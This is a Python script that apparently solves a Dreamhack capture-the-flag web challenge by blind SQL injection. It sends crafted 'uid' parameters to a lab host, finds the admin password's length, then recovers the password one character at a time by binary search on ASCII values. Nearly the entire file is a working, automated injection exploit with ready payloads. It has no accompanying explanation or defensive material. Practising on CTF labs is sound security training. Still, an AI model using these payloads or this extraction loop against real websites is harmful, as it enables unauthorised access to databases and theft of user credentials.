import requests

URL="http://host3.dreamhack.games:10266/"

find_flag_length_payload="'||substr(uid,1,4)='admi'&&length(upw)={}#"

find_flag_char_payload="'||substr(uid,1,4)=='admi'&&substr(upw,{},1)={search}#"

params={
    'uid':''
}

SUCCESSFUL_QUERY_FLAG = 'admin'

def find_flag_length():
    for i in range (44,50):
        params['uid']=find_flag_length_payload.format(i)
        print(f"current length: {i}")
        response= requests.get(URL,params=params)
        if('admin' in response.text):
            return i


def find_flag_char(length):
    flag = ''
    for i in range(len(flag),length+1):
         start,end = 0,127
         while True:
            search = ( start + end ) // 2
            print(f"trying {chr(search)} on position {i}")
            payload = f"'||substr(uid,1,4)='admi'&&ascii(substr(upw,{i},1))>{search}#"
            params['uid'] = payload
            response = requests.get(URL,params=params)
            if(SUCCESSFUL_QUERY_FLAG in response.text):
                start = search
            else:
                payload = f"'||substr(uid,1,4)='admi'&&ascii(substr(upw,{i},1))={search}#"
                params['uid'] = payload

                response = requests.get(URL,params=params)
                if(SUCCESSFUL_QUERY_FLAG in response.text):
                    flag += chr( search )
                    print(f"flag: {flag} ")
                    break
                end = search

find_flag_length()

find_flag_char(find_flag_length())

